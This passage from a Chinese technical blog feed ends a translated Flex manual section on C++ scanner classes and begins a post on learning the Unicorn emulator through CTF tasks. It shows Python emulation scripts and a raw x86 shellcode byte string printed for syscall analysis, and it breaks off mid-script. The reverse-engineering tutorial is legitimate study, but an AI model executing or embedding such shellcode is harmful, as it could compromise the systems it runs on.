)</code></li></ul><p>设置scanner的调试flag，等效于分配给 yy_flex_debug(参考<a href="http://westes.github.io/flex/manual/Scanner-Options.html#Scanner-Options" target="_blank" rel="noopener">Scanner Options</a>),注意必须使用％option debug来构建扫描程序，才能在其中包含调试信息。</p><ul><li><code>int debug() const</code></li></ul><p>返回调试标志的当前设置。</p><p>还提供了等效于yy_switch_to_buffer(),yy_create_buffer()(尽管第一个参数是istream＆对象的引用，而不是FILE *)，yy_flush_buffer(),yy_delete_buffer()和yyrestart()(第一个参数依旧是istream＆对象的引用)的成员函数。</p><p>在FlexLexer.h中的第二个类是yyFlexLexer，它是从FlexLexer派生的。它定义了以下附加成员函数：</p><ul><li><code>yyFlexLexer( istream* arg_yyin = 0, ostream* arg_yyout = 0 )</code></li><li><code>yyFlexLexer( istream&amp; arg_yyin, ostream&amp; arg_yyout )</code></li></ul><p>使用给定的输入和输出流构造yyFlexLexer对象。如果未指定，则流分别默认为cin和cout。yyFlexLexer不拥有其流参数的所有权。用户有责任确保所指向的流至少在yyFlexLexer实例中保持有效。</p><ul><li><code>virtual int yylex()</code></li></ul><p>yylex()和原始的flex scanner起着相同的作用:它会扫描输入流并消耗令牌(tokens)，直到rule的action返回一个值。如果你从yyFlexLexer派生一个子类S并想要在yylex()里访问S的成员函数和变量，则需要使用％option yyclass =”S”通知flex您将使用该子类而不是yyFlexLexer。</p><p>在这种情况下，Flex不会生成yyFlexLexer::yylex()，而是会生成S::yylex()(并且还会生成一个dummy yyFlexLexer::yylex()，如果调用它，则会调用yyFlexLexer::LexerError。</p><ul><li><code>virtual void switch_streams(istream* new_in = 0, ostream* new_out = 0)</code></li><li><code>virtual void switch_streams(istream&amp; new_in, ostream&amp; new_out)</code></li></ul><p>重新分配yyin到new_in(如果非空)，重新分配yyout到new_out(如果非空)，如果重新分配yyin，则删除先前的输入缓冲区。</p><ul><li><code>int yylex( istream* new_in, ostream* new_out = 0 )</code></li><li><code>int yylex( istream&amp; new_in, ostream&amp; new_out )</code></li></ul><p>首先通过switch_streams(new_in，new_out)切换输入流，然后返回yylex()的值。</p><p>此外，yyFlexLexer定义了以下受保护的虚函数，您可以在派生类中重新定义它们以定制scanner：</p><ul><li><code>virtual int LexerInput( char* buf, int max_size )</code></li></ul><p>将最多max_size个字符读取到buf中，并返回读取的字符数。为了表示输入结束，返回0。<br>注意interactive scanner(参考”<a href="http://westes.github.io/flex/manual/Scanner-Options.html#Scanner-Options" target="_blank" rel="noopener">Scanner Options</a>中的’ -B’和’-I’ flag)定义宏YY_INTERACTIVE。<br>如果重新定义LexerInput()并需要根据scanner是否正在扫描interactive input source而采取不同的操作，则可以通过#ifdef语句测试此名称的存在。</p><ul><li><p><code>virtual void LexerOutput( const char* buf, int size )</code><br>从缓冲区buf中写出size个字符，如果scanner的rules可以匹配带有NUL的text，则该文本在NUL终止时也可能包含内部NUL。(？)<br>上句原句:writes out <code>size</code> characters from the buffer <code>buf</code>, which, while <code>NUL</code>-terminated, may also contain internal <code>NUL</code>s if the scanner’s rules can match text with <code>NUL</code>s in them.</p></li><li><p><code>virtual void LexerError( const char* msg )</code><br>报告致命错误消息。该函数的默认版本将message写入流cerr并退出。</p></li></ul><p>注意yyFlexLexer对象包含其整个扫描状态。因此，您可以使用此类对象创建可重入的scanner，但另请参考<a href="http://westes.github.io/flex/manual/Reentrant.html#Reentrant" target="_blank" rel="noopener">Reentrant</a>。你可以实例化同一yyFlexLexer类的多个实例，并且你还可以使用上述的”-P”选项在同一程序中将多个C++ scanner类组合在一起。</p><p>最后，请注意％array功能不适用于C++扫描程序类，你必须使用％pointer(默认设置)。<br>这是一个简单的C++ scanner的示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; An example of using the flex C++ scanner class.</span><br><span class="line"></span><br><span class="line">    %&#123;</span><br><span class="line">    #include &lt;iostream&gt;</span><br><span class="line">    using namespace std;</span><br><span class="line">    int mylineno &#x3D; 0;</span><br><span class="line">    %&#125;</span><br><span class="line"></span><br><span class="line">    %option noyywrap c++</span><br><span class="line"></span><br><span class="line">    string  \&quot;[^\n&quot;]+\&quot;</span><br><span class="line"></span><br><span class="line">    ws      [ \t]+</span><br><span class="line"></span><br><span class="line">    alpha   [A-Za-z]</span><br><span class="line">    dig     [0-9]</span><br><span class="line">    name    (&#123;alpha&#125;|&#123;dig&#125;|\$)(&#123;alpha&#125;|&#123;dig&#125;|[_.\-&#x2F;$])*</span><br><span class="line">    num1    [-+]?&#123;dig&#125;+\.?([eE][-+]?&#123;dig&#125;+)?</span><br><span class="line">    num2    [-+]?&#123;dig&#125;*\.&#123;dig&#125;+([eE][-+]?&#123;dig&#125;+)?</span><br><span class="line">    number  &#123;num1&#125;|&#123;num2&#125;</span><br><span class="line"></span><br><span class="line">    %%</span><br><span class="line"></span><br><span class="line">    &#123;ws&#125;    &#x2F;* skip blanks and tabs *&#x2F;</span><br><span class="line"></span><br><span class="line">    &quot;&#x2F;*&quot;    &#123;</span><br><span class="line">            int c;</span><br><span class="line"></span><br><span class="line">            while((c &#x3D; yyinput()) !&#x3D; 0)</span><br><span class="line">                &#123;</span><br><span class="line">                if(c &#x3D;&#x3D; &#39;\n&#39;)</span><br><span class="line">                    ++mylineno;</span><br><span class="line"></span><br><span class="line">                else if(c &#x3D;&#x3D; &#39;*&#39;)</span><br><span class="line">                    &#123;</span><br><span class="line">                    if((c &#x3D; yyinput()) &#x3D;&#x3D; &#39;&#x2F;&#39;)</span><br><span class="line">                        break;</span><br><span class="line">                    else</span><br><span class="line">                        unput(c);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#123;number&#125;  cout &lt;&lt; &quot;number &quot; &lt;&lt; YYText() &lt;&lt; &#39;\n&#39;;</span><br><span class="line"></span><br><span class="line">    \n        mylineno++;</span><br><span class="line"></span><br><span class="line">    &#123;name&#125;    cout &lt;&lt; &quot;name &quot; &lt;&lt; YYText() &lt;&lt; &#39;\n&#39;;</span><br><span class="line"></span><br><span class="line">    &#123;string&#125;  cout &lt;&lt; &quot;string &quot; &lt;&lt; YYText() &lt;&lt; &#39;\n&#39;;</span><br><span class="line"></span><br><span class="line">    %%</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; This include is required if main() is an another source file.</span><br><span class="line">&#x2F;&#x2F;#include &lt;FlexLexer.h&gt;</span><br><span class="line"></span><br><span class="line">    int main( int &#x2F;* argc *&#x2F;, char** &#x2F;* argv *&#x2F; )</span><br><span class="line">    &#123;</span><br><span class="line">        FlexLexer* lexer &#x3D; new yyFlexLexer;</span><br><span class="line">        while(lexer-&gt;yylex() !&#x3D; 0)</span><br><span class="line">            ;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果要创建多个(不同)词法分析器类，你可以使用”-P”标志(或者是prefix=选项), 将每个yyFlexLexer重命名为其他一些”xxFlexLexer”。然后你可以将<code>&lt;FlexLexer.h&gt;</code>包含在你的其他每一个词法分析类(lexer class)源码中，首先按以下方式重命名yyFlexLexer：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#undef yyFlexLexer</span><br><span class="line">  #define yyFlexLexer xxFlexLexer</span><br><span class="line">  #include &lt;FlexLexer.h&gt;</span><br><span class="line"></span><br><span class="line">  #undef yyFlexLexer</span><br><span class="line">  #define yyFlexLexer zzFlexLexer</span><br><span class="line">  #include &lt;FlexLexer.h&gt;</span><br></pre></td></tr></table></figure><p>例如，如果你为一台scanner使用了％option prefix =”xx”，而另一台则使用％option prefix =”zz”。</p><h2 id="19-Reentrant-C-Scanners"><a href="#19-Reentrant-C-Scanners" class="headerlink" title="19 Reentrant C Scanners"></a>19 Reentrant C Scanners</h2><p>//todo</p><h2 id="20-Incompatibilities-with-Lex-and-Posix"><a href="#20-Incompatibilities-with-Lex-and-Posix" class="headerlink" title="20 Incompatibilities with Lex and Posix"></a>20 Incompatibilities with Lex and Posix</h2><p>//undo</p><h2 id="21-Memory-Management"><a href="#21-Memory-Management" class="headerlink" title="21 Memory Management"></a>21 Memory Management</h2><p>//todo</p><h2 id="22-Serialized-Tables"><a href="#22-Serialized-Tables" class="headerlink" title="22 Serialized Tables"></a>22 Serialized Tables</h2><p>//undo</p><h2 id="23-Diagnostics"><a href="#23-Diagnostics" class="headerlink" title="23 Diagnostics"></a>23 Diagnostics</h2><p>//todo</p><h2 id="24-Limitations"><a href="#24-Limitations" class="headerlink" title="24 Limitations"></a>24 Limitations</h2><p>//todo</p><h2 id="25-Additional-Reading"><a href="#25-Additional-Reading" class="headerlink" title="25 Additional Reading"></a>25 Additional Reading</h2><p>您可能希望阅读有关以下程序的更多信息：</p><ul><li>lex</li><li>yacc</li><li>sed</li><li>awk<br>以下书籍可能包含感兴趣的材料：<br>John Levine，Tony Mason和Doug Brown的《Lex＆Yacc》，O’Reilly和Associates。确保获得第二版。<br>ME Lesk和E.Schmidt的《LEX – Lexical Analyzer Generator》<br>Alfred Aho，Ravi Sethi和Jeffrey Ullman的《Compilers: Principles, Techniques and Tools》，Addison-Wesley(1986)描述flex(确定性有限自动机)使用的模式匹配技术。</li></ul><h2 id="Indices"><a href="#Indices" class="headerlink" title="Indices"></a>Indices</h2><p><a href="http://westes.github.io/flex/manual/Indices.html#Indices" target="_blank" rel="noopener">http://westes.github.io/flex/manual/Indices.html#Indices</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Lexical Analysis With Flex, for Flex 2.6.2<br><a href="http://westes.github.io/flex/manual/" target="_blank" rel="noopener">http://westes.github.io/flex/manual/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;4-Some-Simple-Examples&quot;&gt;&lt;a href=&quot;#4-Some-Simple-Examples&quot; class=&quot;headerlink&quot; title=&quot;4 Some Simple Examples&quot;&gt;&lt;/a&gt;4 Some Simple Exampl
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="compiler" scheme="http://eternalsakura13.com/tags/compiler/"/>
    
      <category term="Lexical Analysis" scheme="http://eternalsakura13.com/tags/Lexical-Analysis/"/>
    
  </entry>
  
  <entry>
    <title>sakuraのall fuzz:afl-unicorn</title>
    <link href="http://eternalsakura13.com/2020/03/18/unicorn_learn/"/>
    <id>http://eternalsakura13.com/2020/03/18/unicorn_learn/</id>
    <published>2020-03-18T14:40:38.493Z</published>
    <updated>2020-04-06T03:09:12.039Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sakuraのall-fuzz-afl-unicorn"><a href="#sakuraのall-fuzz-afl-unicorn" class="headerlink" title="sakuraのall fuzz:afl-unicorn"></a>sakuraのall fuzz:afl-unicorn</h1><p>我一直以来都work在语法类fuzz上，产出了很多高质量的漏洞，但事实上我对其他fuzz所知甚少，这个系列权做对各类fuzz的思考和学习记录。</p><h2 id="unicorn学习"><a href="#unicorn学习" class="headerlink" title="unicorn学习"></a>unicorn学习</h2><p>主要是<a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">unicorn-engine-tutorial</a>这篇文章的学习和一些思考。</p><h3 id="task1"><a href="#task1" class="headerlink" title="task1"></a>task1</h3><p>hxp CTF 2017 Fibonacci<br>因为想折腾新玩意，所以顺便安装了一个ghrida，<a href="https://zhuanlan.zhihu.com/p/59637690" target="_blank" rel="noopener">教程</a>在这</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-18-160723.png" alt=""><br>这个程序整体来看就是输出打印flag，不过打印的非常非常慢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMacBook-Pro:~&#x2F;unicorn$ .&#x2F;fibonacci</span><br><span class="line">The flag is: hxp&#123;F</span><br></pre></td></tr></table></figure><p>我们的目的是将这个程序用unicorn engine跑起来，那么就开始吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化unicorn class</span></span><br><span class="line"><span class="comment"># 第一个参数是指定架构，第二个参数代表64位</span></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-082326.png" alt=""><br>首先需要自己手动去初始化虚拟内存。<br>PS.说到这里我觉得很多对操作系统没什么概念或者学的很差的同学应该就不知道为什么了，这里给出两个资料，把相关部分都看完就理解了。<br><a href="https://www.bilibili.com/video/av69563153?p=77" target="_blank" rel="noopener">程序的表示、转换与链接</a> 关于可执行程序的装载和链接<br><a href="https://www.bilibili.com/video/av13398035?p=48" target="_blank" rel="noopener">程序的执行和存储访问</a> 关于虚拟内存<br><a href="https://www.bilibili.com/video/av74071598?p=6" target="_blank" rel="noopener">异常、中断和输入输出</a></p><p>贴张图，感兴趣的自己去看csapp。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-120401.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-120658.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-121124.png" alt=""><br>找到程序载入到虚拟内存的基地址，0x00400000，然后我们在0x0地址处分配一个栈。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASE &#x3D; 0x400000</span><br><span class="line">STACK_ADDR &#x3D; 0x0</span><br><span class="line">STACK_SIZE &#x3D; 1024*1024</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mu.mem_map(BASE, 1024*1024)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br></pre></td></tr></table></figure><p>将程序load到基地址处，然后设置rsp指向stack。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mu.mem_write(BASE, read(&quot;.&#x2F;fibonacci&quot;))</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - 1)</span><br></pre></td></tr></table></figure><p>现在我们已经像真正加载可执行程序一样，将其加载到了内存中，现在我们就可以开始运行我们的仿真了。<br>现在确定一下想要仿真执行的起始地址和终止地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-082923.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-082942.png" alt=""><br>还是很好找的，0x004004e0-0x00400582</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.emu_start(0x00000000004004E0, 0x0000000000400582)</span><br></pre></td></tr></table></figure><p>unicorn在模拟执行程序的时候提供hook功能。<br>下面这个函数让我们在模拟执行每条指令之前打印出该指令的地址，指令大小。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def hook_code(mu, address, size, user_data):  </span><br><span class="line">    print(&#39;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size &#x3D; 0x%x&#39; %(address, size)) </span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br></pre></td></tr></table></figure><p>最终组合就是下面这个脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line">BASE = <span class="number">0x400000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line">mu.mem_write(BASE, read(<span class="string">"./fibonacci"</span>))</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span></span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(<span class="number">0x00000000004004E0</span>, <span class="number">0x0000000000400582</span>)</span><br></pre></td></tr></table></figure><p>运行遇到如下问题，看一下0x4004ef这条指令为什么会访问到不可访问的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;unicorn$ python3 fibonacci.py</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e0, instruction size &#x3D; 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e1, instruction size &#x3D; 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e2, instruction size &#x3D; 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e4, instruction size &#x3D; 0x5</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e9, instruction size &#x3D; 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004eb, instruction size &#x3D; 0x4</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004ef, instruction size &#x3D; 0x7</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;fibonacci.py&quot;, line 31, in &lt;module&gt;</span><br><span class="line">    mu.emu_start(0x00000000004004E0, 0x0000000000400582)</span><br><span class="line">  File &quot;&#x2F;home&#x2F;sakura&#x2F;.local&#x2F;lib&#x2F;python3.6&#x2F;site-packages&#x2F;unicorn&#x2F;unicorn.py&quot;, line 288, in emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory read (UC_ERR_READ_UNMAPPED)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-130050.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-130103.png" alt=""><br>BSS段属于静态内存分配。通常是指用来存放程序中未初始化的全局变量和未初始化的局部静态变量。未初始化的全局变量和未初始化的局部静态变量默认值是0，本来这些变量也可以放到data段的，但是因为它们都是0，所以它们在data段分配空间并且存放数据0是没有必要的。<br>在程序运行时，才会给BSS段里面的变量分配内存空间。<br>在目标文件(*.o)和可执行文件中，BSS段只是为未初始化的全局变量和未初始化的局部静态变量预留位置而已，它并没有内容，所以它不占据空间。</p><p>虽然我并不熟知unicorn的运作原理，这只是我第一次使用它，但我们是通过read的方式直接把可执行文件读进基地址的，想也知道bss段的内存肯定是没有被分配的。</p><p>所以这里的解决方案是直接在执行这些有问题的指令前，将其rip指向下一条指令，从而跳过这些地址。<br>此外因为我们没有把glibc加载到虚拟地址里，所以我们也不能调用glibc函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">instructions_skip_list = [<span class="number">0x00000000004004EF</span>, <span class="number">0x00000000004004F6</span>, <span class="number">0x0000000000400502</span>, <span class="number">0x000000000040054F</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span>  </span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>改一下hook函数就可以了。<br>然后因为我们需要打印出flag，而原本flag是通过如下函数打印的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_putc((<span class="keyword">int</span>)(<span class="keyword">char</span>)uVar3,(_IO_FILE *)<span class="built_in">stdout</span>)</span><br></pre></td></tr></table></figure><p>而此时_IO_putc是没有加载到内存中的，所以我们并不能调用这个函数。<br>但是可以看到要打印的flag作为第一个参数传递给该函数，而第一个参数是保存在rdi中的，所以只需要在执行这条指令之前读取rdi的值，然后把这个值打印出来即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hook_code</span><span class="params">(mu, address, size, user_data)</span>:</span>  </span><br><span class="line">...</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        print(chr(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-132019.png" alt=""></p><p>其实对我来说能把程序用unicorn跑起来就算是完成任务了。<br>算法优化我并不感兴趣，所以看一下下一个task。</p><h3 id="task2"><a href="#task2" class="headerlink" title="task2"></a>task2</h3><p>分析如下shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode &#x3D; &quot;\xe8\xff\xff\xff\xff\xc0\x5d\x6a\x05\x5b\x29\xdd\x83\xc5\x4e\x89\xe9\x6a\x02\x03\x0c\x24\x5b\x31\xd2\x66\xba\x12\x00\x8b\x39\xc1\xe7\x10\xc1\xef\x10\x81\xe9\xfe\xff\xff\xff\x8b\x45\x00\xc1\xe0\x10\xc1\xe8\x10\x89\xc3\x09\xfb\x21\xf8\xf7\xd0\x21\xd8\x66\x89\x45\x00\x83\xc5\x02\x4a\x85\xd2\x0f\x85\xcf\xff\xff\xff\xec\x37\x75\x5d\x7a\x05\x28\xed\x24\xed\x24\xed\x0b\x88\x7f\xeb\x50\x98\x38\xf9\x5c\x96\x2b\x96\x70\xfe\xc6\xff\xc6\xff\x9f\x32\x1f\x58\x1e\x00\xd3\x80&quot;</span><br></pre></td></tr></table></figure><p>先直接反汇编看一眼，嗯，看不懂。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-134056.png" alt=""><br>作者提示了这个shellcode所用的架构是x86-32，且明确说明了是使用了系统调用。<br>那基本思路就是hook一下int 80，然后把使用的系统调用号从eax里取出来，然后参数依序从ebx,ecx,edx里取出来。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-03-22-143523.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_32)</span><br><span class="line">BASE = <span class="number">0x400000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"></span><br><span class="line">shellcode = <span 